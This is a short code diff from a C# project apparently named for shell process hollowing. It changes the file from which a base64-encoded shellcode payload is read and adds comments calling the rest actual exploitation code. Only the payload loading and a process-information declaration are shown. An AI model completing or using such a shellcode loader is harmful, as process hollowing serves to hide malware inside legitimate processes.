@@ -74,7 +74,11 @@ namespace CShellHollowingTesting
 
     static async Task Main(string[] args)
     {
-      var base64payload = File.ReadAllText("payload");
+      // Pseudocode inserted due to two different payload versions that were used
+      // for testing. One version used a file with the payload being encoded, the other
+      // version used dynamic loading from a local web server.
+      // Rest of the code, aside from these two lines is the actual exploitation code used.
+      var base64payload = File.ReadAllText("placeholder.txt");
       var shellcode = Convert.FromBase64String(base64payload);
 
       PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
